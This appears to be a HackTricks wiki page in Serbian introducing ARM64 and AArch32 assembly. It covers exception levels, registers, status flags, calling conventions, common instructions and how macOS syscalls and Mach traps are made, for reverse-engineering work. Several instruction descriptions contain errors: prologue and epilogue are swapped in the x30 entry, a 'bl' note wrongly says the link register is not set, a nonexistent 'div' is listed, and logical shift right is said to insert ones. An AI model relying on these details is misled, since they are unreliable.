# Uvod u ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Nivoi izuzetaka - EL (ARM64v8)**

U ARMv8 arhitekturi, nivoi izvršavanja, poznati kao nivoi izuzetaka (Exception Levels - EL), definišu nivo privilegija i mogućnosti okruženja za izvršavanje. Postoje četiri nivoa izuzetaka, od EL0 do EL3, a svaki ima drugačiju namenu:

1. **EL0 - User Mode**:
- Ovo je nivo sa najmanje privilegija i koristi se za izvršavanje običnog aplikacionog koda.
- Aplikacije koje rade na EL0 izolovane su jedna od druge i od sistemskog software-a, čime se povećavaju bezbednost i stabilnost.
2. **EL1 - Operating System Kernel Mode**:
- Većina kernel-a operativnih sistema radi na ovom nivou.
- EL1 ima više privilegija od EL0 i može da pristupa sistemskim resursima, ali uz određena ograničenja radi očuvanja integriteta sistema. Sa EL0 na EL1 prelazi se pomoću instrukcije SVC.
3. **EL2 - Hypervisor Mode**:
- Ovaj nivo se koristi za virtualization. Hypervisor koji radi na EL2 može da upravlja većim brojem operativnih sistema (svaki u svom EL1) koji rade na istom fizičkom hardware-u.
- EL2 obezbeđuje funkcije za izolaciju i kontrolu virtualized okruženja.
- Zbog toga aplikacije virtualnih mašina, kao što je Parallels, mogu da koriste `hypervisor.framework` za interakciju sa EL2 i pokretanje virtualnih mašina bez potrebe za kernel extensions.
- Za prelazak sa EL1 na EL2 koristi se instrukcija `HVC`.
4. **EL3 - Secure Monitor Mode**:
- Ovo je nivo sa najviše privilegija i često se koristi za secure booting i trusted execution okruženja.
- EL3 može da upravlja i kontroliše pristup između secure i non-secure stanja (kao što su secure boot, trusted OS itd.).
- Koristio se za KPP (Kernel Patch Protection) u macOS-u, ali se više ne koristi.
- Apple više ne koristi EL3.
- Prelazak na EL3 se obično vrši pomoću instrukcije `SMC` (Secure Monitor Call).

Korišćenje ovih nivoa omogućava strukturiran i bezbedan način upravljanja različitim delovima sistema, od korisničkih aplikacija do sistemskog software-a sa najviše privilegija. ARMv8 pristup nivoima privilegija pomaže u efikasnoj izolaciji različitih komponenti sistema, čime se povećavaju bezbednost i robusnost sistema.

## **Registri (ARM64v8)**

ARM64 ima **31 register opšte namene**, označenih kao `x0` do `x30`. Svaki može da čuva vrednost od **64 bita** (8 bajtova). Za operacije koje zahtevaju samo 32-bitne vrednosti, istim registrima može se pristupiti u 32-bitnom režimu pomoću imena w0 do w30.

1. **`x0`** do **`x7`** - Obično se koriste kao scratch registri i za prosleđivanje parametara potprogramima.
- **`x0`** takođe sadrži povratne podatke funkcije
2. **`x8`** - U Linux kernel-u, `x8` se koristi kao broj sistemskog poziva za `svc` instrukciju. **U macOS-u koristi se x16!**
3. **`x9`** do **`x15`** - Dodatni privremeni registri, koji se često koriste za lokalne promenljive.
4. **`x16`** i **`x17`** - **Intra-procedural Call Registers**. Privremeni registri za neposredne vrednosti. Takođe se koriste za indirektne pozive funkcija i PLT (Procedure Linkage Table) stub-ove.
- **`x16`** se koristi kao **broj sistemskog poziva** za **`svc`** instrukciju u **macOS-u**.
5. **`x18`** - **Platform register**. Može se koristiti kao register opšte namene, ali je na nekim platformama rezervisan za potrebe specifične za platformu: pokazivač na current thread environment block u Windows-u ili pokazivač na trenutno **executing task structure u linux kernel-u**.
6. **`x19`** do **`x28`** - Ovo su callee-saved registri. Funkcija mora da sačuva vrednosti ovih registara za svog pozivaoca, pa se oni čuvaju na stack-u i obnavljaju pre povratka pozivaocu.
7. **`x29`** - **Frame pointer** koji prati stack frame. Kada se kreira novi stack frame zbog poziva funkcije, register **`x29`** se **čuva na stack-u**, a adresa novog frame pointer-a (adresa **`sp`**) **čuva se u ovom registru**.
- Ovaj register može da se koristi i kao **register opšte namene**, iako se obično koristi kao referenca na **lokalne promenljive**.
8. **`x30`** ili **`lr`** - **Link register**. Sadrži **povratnu adresu** kada se izvrši instrukcija `BL` (Branch with Link) ili `BLR` (Branch with Link to Register), tako što se vrednost **`pc`** upisuje u ovaj register.
- Može se koristiti i kao bilo koji drugi register.
- Ako će trenutna funkcija pozvati novu funkciju i time prepisati `lr`, sačuvaće ga na stack-u na početku; ovo je epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> čuva `fp` i `lr`, kreira prostor i dobija novi `fp`), a zatim ga obnavlja na kraju; ovo je prologue (`ldp x29, x30, [sp], #48; ret` -> obnavlja `fp` i `lr` i vraća se).
9. **`sp`** - **Stack pointer**, koristi se za praćenje vrha stack-a.
- Vrednost **`sp`** uvek mora da bude najmanje **quadword** **poravnata**, u suprotnom može doći do alignment exception-a.
10. **`pc`** - **Program counter**, koji pokazuje na sledeću instrukciju. Ovaj register može da se ažurira samo kroz generisanje izuzetaka, povratke iz izuzetaka i grananja. Jedine obične instrukcije koje mogu da čitaju ovaj register jesu branch with link instrukcije (BL, BLR), koje čuvaju adresu **`pc`** u **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. U svom 32-bitnom obliku naziva se i **`wzr`**. Može se koristiti za jednostavno dobijanje nulte vrednosti (česta operacija) ili za poređenja pomoću **`subs`**, kao u **`subs XZR, Xn, #10`**, pri čemu se rezultujući podaci nigde ne čuvaju (u **`xzr`**).

**`Wn`** registri su **32-bitna** verzija registra **`Xn`**.

> [!TIP]
> Registri od X0 do X18 su volatile, što znači da njihove vrednosti mogu biti promenjene pozivima funkcija i interrupt-ima. Međutim, registri od X19 do X28 su non-volatile, što znači da njihove vrednosti moraju biti očuvane tokom poziva funkcija ("callee saved").

### SIMD i Floating-Point registri

Pored toga, postoji još **32 registra dužine 128 bita** koji mogu da se koriste u optimizovanim SIMD operacijama (single instruction multiple data) i za izvršavanje floating-point aritmetike. Oni se nazivaju Vn registri, iako mogu da rade i u režimima od **64**, **32**, **16** i **8** bita, kada se nazivaju **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** i **`Bn`**.

### System registri

**Postoje stotine system registara**, koji se nazivaju i registri posebne namene (SPRs), a koriste se za **monitoring** i **kontrolu** ponašanja **procesora**.\
Mogu se čitati ili podešavati samo pomoću posebnih instrukcija **`mrs`** i **`msr`**.

Specijalni registri **`TPIDR_EL0`** i **`TPIDDR_EL0`** često se pronalaze prilikom reverse engineering-a. Sufiks `EL0` označava **minimalni nivo izuzetka** sa kog se registru može pristupiti (u ovom slučaju, EL0 je regularni nivo izuzetka (privilegija) sa kojim rade regularni programi).\
Često se koriste za čuvanje **bazne adrese** regiona memorije za thread-local storage. Obično je prvi registar čitljiv i upisiv za programe koji rade na EL0, dok drugi može da se čita iz EL0 i upisuje iz EL1 (kao kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** sadrži nekoliko komponenti procesa serijalizovanih u specijalni register vidljiv operativnom sistemu, **`SPSR_ELx`**, pri čemu X predstavlja **nivo privilegija** **izazvanog** izuzetka (ovo omogućava obnavljanje stanja procesa kada se izuzetak završi).\
Ovo su dostupna polja:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Uslovne zastavice **`N`**, **`Z`**, **`C`** i **`V`**:
- **`N`** znači da je operacija dala negativan rezultat
- **`Z`** znači da je operacija dala nulu
- **`C`** znači da je operacija proizvela carry
- **`V`** znači da je operacija proizvela signed overflow:
- Zbir dva pozitivna broja daje negativan rezultat.
- Zbir dva negativna broja daje pozitivan rezultat.
- Kod oduzimanja, kada se veliki negativni broj oduzme od manjeg pozitivnog broja (ili obrnuto), a rezultat ne može da se predstavi u opsegu datog broja bitova.
- Očigledno je da processor ne zna da li je operacija signed ili unsigned, pa će proveriti C i V u operacijama i označiti da li je došlo do carry-ja u slučaju da je operacija signed ili unsigned.

> [!WARNING]
> Ne ažuriraju sve instrukcije ove zastavice. Neke, kao **`CMP`** ili **`TST`**, to rade, kao i druge koje imaju s sufiks, poput **`ADDS`**.

- Zastavica trenutne širine registra (`nRW`): Ako zastavica ima vrednost 0, program će nakon nastavka rada izvršavati u AArch64 execution state-u.
- Trenutni **Exception Level** (**`EL`**): Regularni program koji radi na EL0 imaće vrednost 0
- Zastavica **single stepping-a** (**`SS`**): Koriste je debugger-i za izvršavanje instrukcija korak po korak, postavljanjem SS zastavice na 1 unutar **`SPSR_ELx`** kroz izuzetak. Program će izvršiti jedan korak i generisati single step exception.
- Zastavica stanja **illegal exception-a** (**`IL`**): Koristi se za označavanje situacije kada privileged software izvrši nevažeći transfer nivoa izuzetka; ova zastavica se postavlja na 1 i processor generiše illegal state exception.
- Zastavice **`DAIF`**: Ove zastavice omogućavaju privileged programu da selektivno maskira određene spoljne izuzetke.
- Ako je **`A`** jednako 1, to znači da će biti generisani **asynchronous aborts**. **`I`** podešava odgovor na spoljne hardware **Interrupts Requests** (IRQ). F se odnosi na **Fast Interrupt Requests** (FIR).
- Zastavice za izbor stack pointer-a (**`SPS`**): Privileged programi koji rade na EL1 i višim nivoima mogu da menjaju korišćenje sopstvenog stack pointer registra i user-model registra (npr. između `SP_EL1` i `EL0`). Ovo prebacivanje se vrši upisivanjem u specijalni register **`SPSel`**. To nije moguće iz EL0.

## **Calling Convention (ARM64v8)**

ARM64 calling convention navodi da se **prvih osam parametara** funkcije prosleđuje kroz registre **`x0`** do **`x7`**. **Dodatni** parametri prosleđuju se kroz **stack**. **Povratna** vrednost prosleđuje se nazad kroz register **`x0`**, ili takođe kroz **`x1`** **ako je dugačka 128 bita**. Registri **`x19`** do **`x30`** i **`sp`** moraju biti **očuvani** tokom poziva funkcija.

Prilikom čitanja funkcije u assembly-ju, potražite **function prologue i epilogue**. **Prologue** obično podrazumeva **čuvanje frame pointer-a (`x29`)**, postavljanje **novog frame pointer-a** i **alokaciju prostora na stack-u**. **Epilogue** obično podrazumeva **obnavljanje sačuvanog frame pointer-a** i **povratak** iz funkcije.

### Calling Convention u Swift-u

Swift ima sopstveni **calling convention**, koji se može pronaći na [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Uobičajene instrukcije (ARM64v8)**

ARM64 instrukcije uglavnom imaju **format `opcode dst, src1, src2`**, gde je **`opcode`** operacija koju treba izvršiti (kao što su `add`, `sub`, `mov` itd.), **`dst`** odredišni register u koji će se smestiti rezultat, a **`src1`** i **`src2`** izvorni registri. Umesto izvornih registara mogu se koristiti i immediate vrednosti.

- **`mov`**: **Premešta** vrednost iz jednog **registra** u drugi.
- Primer: `mov x0, x1` — Premešta vrednost iz `x1` u `x0`.
- **`ldr`**: **Učitava** vrednost iz **memorije** u **register**.
- Primer: `ldr x0, [x1]` — Učitava vrednost sa memorijske lokacije na koju pokazuje `x1` u `x0`.
- **Offset mode**: Offset koji utiče na origin pointer označava se, na primer:
- `ldr x2, [x1, #8]`, učitava u x2 vrednost iz x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, učitava u x2 objekat iz niza x0, sa pozicije x1 (index) \* 4
- **Pre-indexed mode**: Primenjuje izračunavanja na origin, dobija rezultat i takođe čuva novi origin u origin-u.
- `ldr x2, [x1, #8]!`, učitava `x1 + 8` u `x2` i čuva rezultat `x1 + 8` u x1
- `str lr, [sp, #-4]!`, čuva link register u sp i ažurira register sp
- **Post-index mode**: Kao prethodni, ali se memorijskoj adresi pristupa, a zatim se offset izračunava i čuva.
- `ldr x0, [x1], #8`, učitava `x1` u `x0` i ažurira x1 sa `x1 + 8`
- **PC-relative addressing**: U ovom slučaju, adresa za učitavanje izračunava se relativno u odnosu na PC register
- `ldr x1, =_start`, učitava adresu na kojoj počinje simbol `_start` u x1, u odnosu na trenutni PC.
- **`str`**: **Čuva** vrednost iz **registra** u **memoriju**.
- Primer: `str x0, [x1]` — Čuva vrednost iz `x0` na memorijskoj lokaciji na koju pokazuje `x1`.
- **`ldp`**: **Load Pair of Registers**. Ova instrukcija **učitava dva registra** sa **uzastopnih memorijskih** lokacija. Memorijska adresa se obično formira dodavanjem offset-a vrednosti u drugom registru.
- Primer: `ldp x0, x1, [x2]` — Učitava `x0` i `x1` sa memorijskih lokacija `x2` i `x2 + 8`, redom.
- **`stp`**: **Store Pair of Registers**. Ova instrukcija **čuva dva registra** na **uzastopne memorijske** lokacije. Memorijska adresa se obično formira dodavanjem offset-a vrednosti u drugom registru.
- Primer: `stp x0, x1, [sp]` — Čuva `x0` i `x1` na memorijskim lokacijama `sp` i `sp + 8`, redom.
- `stp x0, x1, [sp, #16]!` — Čuva `x0` i `x1` na memorijskim lokacijama `sp+16` i `sp + 24`, redom, i ažurira `sp` vrednošću `sp+16`.
- **`add`**: **Sabira** vrednosti dva registra i čuva rezultat u registru.
- Sintaksa: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Odredište
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register ili immediate)
- \[shift #N | RRX] -> Izvršava shift ili poziva RRX
- Primer: `add x0, x1, x2` — Sabira vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
- `add x5, x5, #1, lsl #12` — Ovo je jednako 4096 (jedinica pomerena 12 puta) -> 1 0000 0000 0000 0000
- **`adds`** Izvršava `add` i ažurira zastavice
- **`sub`**: **Oduzima** vrednosti dva registra i čuva rezultat u registru.
- Pogledajte **`add`** **sintaksu**.
- Primer: `sub x0, x1, x2` — Oduzima vrednost iz `x2` od `x1` i čuva rezultat u `x0`.
- **`subs`** Isto kao sub, ali ažurira zastavicu
- **`mul`**: **Množi** vrednosti **dva registra** i čuva rezultat u registru.
- Primer: `mul x0, x1, x2` — Množi vrednosti u `x1` i `x2` i čuva rezultat u `x0`.
- **`div`**: **Deli** vrednost jednog registra drugim i čuva rezultat u registru.
- Primer: `div x0, x1, x2` — Deli vrednost u `x1` sa `x2` i čuva rezultat u `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Dodaje nule sa kraja i pomera ostale bitove unapred (množenje sa n puta 2)
- **Logical shift right**: Dodaje jedinice na početku i pomera ostale bitove unazad (deljenje sa n puta 2 kod unsigned vrednosti)
- **Arithmetic shift right**: Kao **`lsr`**, ali se umesto nula, ako je najznačajniji bit 1, dodaju **jedinice (deljenje sa n puta 2 kod signed vrednosti)
- **Rotate right**: Kao **`lsr`**, ali se ono što se ukloni sa desne strane dodaje sa leve strane
- **Rotate Right with Extend**: Kao **`ror`**, ali se carry zastavica koristi kao "najznačajniji bit". Zato se carry zastavica pomera na bit 31, a uklonjeni bit u carry zastavicu.
- **`bfm`**: **Bit Filed Move**, ove operacije **kopiraju bitove `0...n`** iz vrednosti i postavljaju ih na pozicije **`m..m+n`**. **`#s`** označava poziciju **najlevljeg bita**, a **`#r`** količinu rotate right pomeranja.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Kopira bitfield iz jednog registra i kopira ga u drugi register.
- **`BFI X1, X2, #3, #4`** Ubacuje 4 bita iz X2 počev od 3. bita registra X1
- **`BFXIL X1, X2, #3, #4`** Izdvaja četiri bita počev od 3. bita registra X2 i kopira ih u X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bita iz X2 i ubacuje ih u X1 počev od pozicije bita 3, postavljajući desne bitove na nulu
- **`SBFX X1, X2, #3, #4`** Izdvaja 4 bita počev od bita 3 iz X2, sign extends ih i smešta rezultat u X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bita iz X2 i ubacuje ih u X1 počev od pozicije bita 3, postavljajući desne bitove na nulu
- **`UBFX X1, X2, #3, #4`** Izdvaja 4 bita počev od bita 3 iz X2 i smešta zero-extended rezultat u X1.
- **Sign Extend To X:** Proširuje znak (ili dodaje samo nule u unsigned verziji) vrednosti kako bi se omogućilo izvršavanje operacija nad njom:
- **`SXTB X1, W2`** Proširuje znak bajta **iz W2 u X1** (`W2` je polovina od `X2`) kako bi popunio 64 bita
- **`SXTH X1, W2`** Proširuje znak 16-bitnog broja **iz W2 u X1** kako bi popunio 64 bita
- **`SXTW X1, W2`** Proširuje znak bajta **iz W2 u X1** kako bi popunio 64 bita
- **`UXTB X1, W2`** Dodaje nule (unsigned) bajtu **iz W2 u X1** kako bi popunio 64 bita
- **`extr`:** Izdvaja bitove iz navedenog **para konkateniranih registara**.
- Primer: `EXTR W3, W2, W1, #3` Ovo će **konkatenirati W1+W2** i uzeti **od bita 3 u W2 do bita 3 u W1**, a zatim ih smestiti u W3.
- **`cmp`**: **Poredi** dva registra i postavlja uslovne zastavice. To je **alias za `subs`** koji odredišni register postavlja na zero register. Korisno je za proveru da li je `m == n`.
- Podržava **istu sintaksu kao `subs`**
- Primer: `cmp x0, x1` — Poredi vrednosti u `x0` i `x1` i postavlja uslovne zastavice u skladu sa tim.
- **`cmn`**: **Compare negative** operand. U ovom slučaju to je **alias za `adds`** i podržava istu sintaksu. Korisno je za proveru da li je `m == -n`.
- **`ccmp`**: Uslovno poređenje; poređenje će biti izvršeno samo ako je prethodno poređenje bilo uspešno i konkretno će postaviti nzcv bitove.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ako je x1 != x2 i x3 < x4, skače na func
- Ovo je zato što će **`ccmp`** biti izvršen samo ako je prethodni **`cmp`** bio **`NE`**; ako nije bio, bitovi `nzcv` biće postavljeni na 0 (što neće zadovoljiti `blt` poređenje).
- Ovo se takođe može koristiti kao `ccmn` (isto, ali negativno, kao `cmp` u odnosu na `cmn`).
- **`tst`**: Proverava da li su neke od vrednosti poređenja obe 1 (radi kao ANDS, ali ne čuva rezultat nigde). Korisno je za proveru registra pomoću vrednosti i proveru da li je neki od bitova registra označenih tom vrednošću jednak 1.
- Primer: `tst X1, #7` Proverava da li je neki od poslednja 3 bita X1 jednak 1
- **`teq`**: XOR operacija koja odbacuje rezultat
- **`b`**: Unconditional Branch
- Primer: `b myFunction`
- Imajte na umu da ovo neće popuniti link register povratnom adresom (nije pogodno za pozive potprograma koji moraju da se vrate nazad)
- **`bl`**: **Branch** with link, koristi se za **pozivanje** **potprograma**. Čuva **povratnu adresu u `x30`**.
- Primer: `bl myFunction` — Poziva funkciju `myFunction` i čuva povratnu adresu u `x30`.
- Imajte na umu da ovo neće popuniti link register povratnom adresom (nije pogodno za pozive potprograma koji moraju da se vrate nazad)
- **`blr`**: **Branch** with Link to Register, koristi se za **pozivanje** **potprograma** čija je ciljna adresa navedena u **registru**. Čuva povratnu adresu u `x30`. (Ovo je
- Primer: `blr x1` — Poziva funkciju čija se adresa nalazi u `x1` i čuva povratnu adresu u `x30`.
- **`ret`**: **Povratak** iz **potprograma**, obično pomoću adrese u **`x30`**.
- Primer: `ret` — Vraća se iz trenutnog potprograma pomoću povratne adrese u `x30`.
- **`b.<cond>`**: Uslovna grananja
- **`b.eq`**: **Branch if equal**, na osnovu prethodne `cmp` instrukcije.
- Primer: `b.eq label` — Ako je prethodna `cmp` instrukcija pronašla dve jednake vrednosti, skače na `label`.
- **`b.ne`**: **Branch if Not Equal**. Ova instrukcija proverava uslovne zastavice (koje je postavila prethodna instrukcija poređenja) i, ako upoređene vrednosti nisu jednake, grana na labelu ili adresu.
- Primer: Nakon instrukcije `cmp x0, x1`, `b.ne label` — Ako vrednosti u `x0` i `x1` nisu jednake, skače na `label`.
- **`cbz`**: **Compare and Branch on Zero**. Ova instrukcija poredi register sa nulom i, ako su jednaki, grana na labelu ili adresu.
- Primer: `cbz x0, label` — Ako je vrednost u `x0` nula, skače na `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Ova instrukcija poredi register sa nulom i, ako nisu jednaki, grana na labelu ili adresu.
- Primer: `cbnz x0, label` — Ako vrednost u `x0` nije nula, skače na `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Primer: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Primer: `tbz x0, #8, label`
- **Conditional select operations**: Ovo su operacije čije se ponašanje menja u zavisnosti od uslovnih bitova.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ako je uslov tačan, X0 = X1, a ako je netačan, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ako je uslov tačan, Xd = Xn, a ako je netačan, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ako je uslov tačan, Xd = Xn + 1, a ako je netačan, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ako je uslov tačan, Xd = Xn, a ako je netačan, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ako je uslov tačan, Xd = NOT(Xn), a ako je netačan, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ako je uslov tačan, Xd = Xn, a ako je netačan, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ako je uslov tačan, Xd = - Xn, a ako je netačan, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ako je uslov tačan, Xd = 1, a ako je netačan, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ako je uslov tačan, Xd = \<all 1>, a ako je netačan, Xd = 0
- **`adrp`**: Izračunava **page address simbola** i čuva je u registru.
- Primer: `adrp x0, symbol` — Izračunava page address od `symbol` i čuva je u `x0`.
- **`ldrsw`**: **Učitava** signed **32-bitnu** vrednost iz memorije i **sign-extend-uje je na 64** bita. Koristi se za uobičajene SWITCH slučajeve.
- Primer: `ldrsw x0, [x1]` — Učitava signed 32-bitnu vrednost sa memorijske lokacije na koju pokazuje `x1`, sign-extends je na 64 bita i čuva u `x0`.
- **`stur`**: **Čuva vrednost registra na memorijskoj lokaciji**, koristeći offset u odnosu na drugi register.
- Primer: `stur x0, [x1, #4]` — Čuva vrednost iz `x0` na memorijsku adresu koja je 4 bajta veća od adrese koja se trenutno nalazi u `x1`.
- **`svc`** : Izvršava **system call**. Označava "Supervisor Call". Kada processor izvrši ovu instrukciju, **prebacuje se iz user mode-a u kernel mode** i skače na određenu lokaciju u memoriji na kojoj se nalazi kod za **obradu system call-ova kernel-a**.

- Primer:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Čuvanje link registra i frame pointer-a na stack-u**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Postavite novi pokazivač okvira**: `mov x29, sp` (postavlja novi pokazivač okvira za trenutnu funkciju)
3. **Alocirajte prostor na stack-u za lokalne promenljive** (ako je potrebno): `sub sp, sp, <size>` (gde je `<size>` broj potrebnih bajtova)

### **Epilog funkcije**

1. **Dealocirajte lokalne promenljive** (ako su prethodno alocirane): `add sp, sp, <size>`
2. **Vratite link register i pokazivač okvira**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Povratak**: `ret` (vraća kontrolu pozivaocu koristeći adresu u link registru)

## Uobičajene ARM zaštite memorije

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A podržava izvršavanje 32-bitnih programa. **AArch32** može raditi u jednom od **dva skupa instrukcija**: **`A32`** i **`T32`**, i može prelaziti između njih putem **`interworking`**.\
**Privileged** 64-bitni programi mogu zakazati **izvršavanje 32-bitnih** programa izvršavanjem prenosa nivoa izuzetka na niži privilegovani 32-bitni nivo.\
Imajte na umu da se prelazak sa 64-bitnog na 32-bitni režim odvija spuštanjem nivoa izuzetka (na primer, 64-bitni program u EL1 pokreće program u EL0). To se postiže postavljanjem **bita 4 u** specijalnom registru **`SPSR_ELx`** **na 1** kada je nit procesa `AArch32` spremna za izvršavanje, dok ostatak registra `SPSR_ELx` čuva CPSR **`AArch32`** programa. Zatim privilegovani proces poziva instrukciju **`ERET`**, pa procesor prelazi u **`AArch32`** i ulazi u A32 ili T32, u zavisnosti od CPSR**.**

**`interworking`** se odvija korišćenjem J i T bitova CPSR-a. `J=0` i `T=0` označavaju **`A32`**, dok `J=0` i `T=1` označavaju **T32**. To se u osnovi svodi na postavljanje **najnižeg bita na 1** kako bi se označilo da je skup instrukcija T32.\
Ovo se postavlja tokom **instrukcija grananja `interworking`**, ali se može postaviti i direktno drugim instrukcijama kada je PC postavljen kao odredišni registar. Primer:

Još jedan primer:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registri

Postoji 16 32-bitnih registara (r0-r15). **Od r0 do r14** mogu se koristiti za **bilo koju operaciju**, međutim neki od njih su obično rezervisani:

- **`r15`**: Programski brojač (uvek). Sadrži adresu sledeće instrukcije. U A32, current + 8, a u T32, current + 4.
- **`r11`**: Pokazivač okvira
- **`r12`**: Registar za pozive unutar procedure
- **`r13`**: Pokazivač steka (imajte na umu da je stek uvek poravnat na 16 bajtova)
- **`r14`**: Registar povratne adrese

Pored toga, registri se čuvaju u **`banked registries`**. To su mesta koja čuvaju vrednosti registara i omogućavaju **brzo prebacivanje konteksta** tokom obrade izuzetaka i privilegovanih operacija, kako bi se izbegla potreba za ručnim čuvanjem i vraćanjem registara svaki put.\
Ovo se postiže **čuvanjem stanja procesora iz `CPSR` u `SPSR`** režima procesora u koji se prelazi nakon izuzetka. Prilikom povratka iz izuzetka, **`CPSR`** se vraća iz **`SPSR`**.

### CPSR - Registar statusa trenutnog programa

U AArch32, CPSR radi slično kao **`PSTATE`** u AArch64 i takođe se čuva u **`SPSR_ELx`** kada dođe do izuzetka, kako bi se kasnije nastavilo izvršavanje:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Polja su podeljena u nekoliko grupa:

- Application Program Status Register (APSR): Aritmetičke zastavice, dostupne iz EL0
- Execution State Registers: Ponašanje procesa (kojim upravlja OS).

#### Application Program Status Register (APSR)

- Zastavice **`N`**, **`Z`**, **`C`**, **`V`** (isto kao u AArch64)
- Zastavica **`Q`**: Postavlja se na 1 svaki put kada tokom izvršavanja specijalizovane saturirajuće aritmetičke instrukcije dođe do **integer saturation**. Kada se postavi na **`1`**, zadržava tu vrednost sve dok se ručno ne postavi na 0. Pored toga, ne postoji nijedna instrukcija koja implicitno proverava njenu vrednost; to mora da se uradi njenim ručnim očitavanjem.
- Zastavice **`GE`** (Greater than or equal): Koriste se u SIMD (Single Instruction, Multiple Data) operacijama, kao što su „parallel add“ i „parallel subtract“. Ove operacije omogućavaju obradu više podataka jednom instrukcijom.

Na primer, instrukcija **`UADD8`** paralelno **sabira četiri para bajtova** (iz dva 32-bitna operanda) i smešta rezultate u 32-bitni registar. Zatim, na osnovu ovih rezultata, **postavlja zastavice `GE` u `APSR`**. Svaka GE zastavica odgovara jednom sabiranju bajtova i pokazuje da li je pri sabiranju tog para bajtova došlo do **prekoračenja**.

Instrukcija **`SEL`** koristi ove GE zastavice za izvršavanje uslovnih radnji.

#### Execution State Registers

- Bitovi **`J`** i **`T`**: **`J`** treba da bude 0. Ako je **`T`** 0, koristi se skup instrukcija A32, a ako je 1, koristi se T32.
- **IT Block State Register** (`ITSTATE`): Ovo su bitovi 10-15 i 25-26. Oni čuvaju uslove za instrukcije unutar grupe kojoj prethodi **`IT`**.
- Bit **`E`**: Označava **endianness**.
- **Mode and Exception Mask Bits** (0-4): Određuju trenutno stanje izvršavanja. **Peti** bit pokazuje da li program radi kao 32-bitni (vrednost 1) ili 64-bitni (vrednost 0). Preostala 4 bita predstavljaju **exception mode** koji se trenutno koristi (kada dođe do izuzetka i on se obrađuje). Postavljena vrednost **označava trenutni prioritet** u slučaju da se tokom obrade ovog izuzetka pokrene još jedan izuzetak.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Određeni izuzeci mogu se onemogućiti pomoću bitova **`A`**, `I`, `F`. Ako je **`A`** 1, to znači da će se pokretati **asynchronous aborts**. **`I`** podešava odgovor na spoljašnje hardverske **Interrupts Requests** (IRQ). `F` se odnosi na **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Pogledajte [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ili pokrenite `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls će imati **x16 > 0**.

### Mach Traps

U [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) pogledajte `mach_trap_table`, a u [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) prototipe. Maksimalan broj Mach traps je `MACH_TRAP_TABLE_COUNT` = 128. Mach traps će imati **x16 < 0**, zato brojeve iz prethodne liste treba pozvati sa **minusom**: **`_kernelrpc_mach_vm_allocate_trap`** je **`-10`**.

Takođe možete proveriti **`libsystem_kernel.dylib`** u disassembleru kako biste pronašli način pozivanja ovih (i BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Imajte na umu da **Ida** i **Ghidra** takođe mogu da dekompajliraju **specific dylibs** iz cache-a, jednostavnim prosleđivanjem cache-a.

> [!TIP]
